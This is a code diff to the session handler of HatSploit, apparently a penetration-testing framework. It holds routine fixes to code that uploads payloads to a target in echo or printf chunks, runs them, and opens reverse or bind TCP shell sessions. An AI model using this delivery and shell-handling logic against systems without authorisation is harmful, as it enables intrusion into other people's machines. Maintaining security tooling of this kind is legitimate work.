@@ -151,11 +151,11 @@ class Handler(Server):
         for i in range(0, num_parts):
             current = i * echo_max_length
             block = self.bytes_to_octal(payload[current:current + echo_max_length])
-            command = echo_stream.format(block, path)
-            print(command)
+            if block:
+                command = echo_stream.format(block, path)
 
-            self.badges.output_multi(f"Uploading payload... ({str(current)}/{str(size)})")
-            sender(*args, command)
+                self.badges.output_multi(f"Uploading payload... ({str(current)}/{str(size)})")
+                sender(*args, command)
 
         self.badges.output_process("Executing payload...")
         args = args if args is not None else ""
@@ -177,10 +177,11 @@ class Handler(Server):
         for i in range(0, num_parts):
             current = i * printf_max_length
             block = self.bytes_to_octal(payload[current:current + printf_max_length])
-            command = printf_stream.format(block, path)
+            if block:
+                command = printf_stream.format(block, path)
 
-            self.badges.output_multi(f"Uploading payload... ({str(current)}/{str(size)})")
-            sender(*args, command)
+                self.badges.output_multi(f"Uploading payload... ({str(current)}/{str(size)})")
+                sender(*args, command)
 
         self.badges.output_process("Executing payload...")
         args = args if args is not None else ""
@@ -212,7 +213,7 @@ class Handler(Server):
             )
 
     def handle_session(self, host, port, payload, sender=None, args=[],
-                       delim=';', location='/tmp', timeout=10, method=None, post="printf"):
+                       delim=';', remote_host=None, location='/tmp', timeout=10, method=None, post="printf"):
         if payload['Payload'] is None:
             self.badges.output_error("Payload stage is not found!")
             return False
@@ -291,13 +292,13 @@ class Handler(Server):
             if method is not None:
                 encode = True
                 if method.lower() == 'reverse_tcp':
-                    new_session, remote_host = self.listen_session(host, port, timeout, HatSploitSession)
-                    if not new_session and not remote_host:
+                    new_session, new_remote_host = self.listen_session(host, port, timeout, HatSploitSession)
+                    if not new_session and not new_remote_host:
                         return False
 
                 if method.lower() == 'bind_tcp':
                     new_session = self.connect_session(host, port, timeout, HatSploitSession)
-                    remote_host = host
+                    new_remote_host = host
                     if not new_session:
                         return False
 
@@ -376,13 +377,13 @@ class Handler(Server):
         session = payload['Session'] if payload['Session'] is not None else HatSploitSession
 
         if payload['Type'].lower() == 'reverse_tcp':
-            new_session, remote_host = self.listen_session(host, port, timeout, session)
-            if not new_session and not remote_host:
+            new_session, new_remote_host = self.listen_session(host, port, timeout, session)
+            if not new_session and not new_remote_host:
                 return False
 
         if payload['Type'].lower() == 'bind_tcp':
             new_session = self.connect_session(host, port, timeout, session)
-            remote_host = host
+            new_remote_host = host
             if not new_session:
                 return False
 
@@ -394,6 +395,8 @@ class Handler(Server):
         session_platform = new_session.details['Platform']
         session_type = new_session.details['Type']
 
+        if not remote_host:
+            remote_host = new_remote_host
         session_id = self.sessions.add_session(session_platform, session_type, remote_host, port, new_session)
         self.badges.output_success("Session " + str(session_id) + " opened!")
         return True
